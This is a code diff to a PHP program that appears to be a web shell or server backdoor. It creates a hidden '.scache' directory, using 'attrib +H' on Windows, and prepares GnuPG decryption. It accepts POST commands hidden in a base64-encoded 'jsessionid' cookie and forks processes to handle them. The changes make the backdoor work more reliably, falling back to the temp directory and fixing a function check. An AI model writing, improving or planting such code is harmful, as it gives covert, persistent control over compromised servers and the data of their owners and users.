@@ -40,13 +40,21 @@ if (!defined("dirSeparator")){
 
 if (slopos === "Windows"){
     if (!is_dir(".\\scache")){
-        mkdir(".\\scache");
+        if (is_writable(getcwd())){
+            mkdir(".\\scache");
+        }else{
+            mkdir(sprintf("%s\\scache", sys_get_temp_dir()));
+        }
         shell_exec("attrib +H .\\scache");
     }
     define("scache", getcwd()."\\scache");
 }else{
     if (!is_dir("./.scache")){
-        mkdir("./.scache");
+        if (is_writable(getcwd())) {
+            mkdir("./.scache");
+        }else{
+            mkdir(sprintf("%s/.scache", sys_get_temp_dir()));
+        }
     }
     define("scache", getcwd()."/.scache");
 }
@@ -54,7 +62,7 @@ if (slopos === "Windows"){
 if (function_exists("gnupg_decrypt") && function_exists("gnupg_key_import") && function_exists("escapeshellarg")){
     if (!defined("slopPGP")){
         define("slopPGP", true);
-        putenv(sprintf("GNUPGHOME=%s/.scache/.gnupg", scache));
+        putenv(sprintf("GNUPGHOME=%s/.gnupg", scache));
     }else{
         define("slopPGP", false);
     }
@@ -396,7 +404,7 @@ function slopp()
                 }
             } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['jsessionid']) {
                 $splitter = explode(".", base64_decode($_COOKIE['jsessionid']));
-                if (function_exists(pcntl_fork()) === true) {
+                if (function_exists('pcntl_fork') === true) {
                     $pid = pcntl_fork();
                     if ($pid === -1) {
                         die("\n\n");
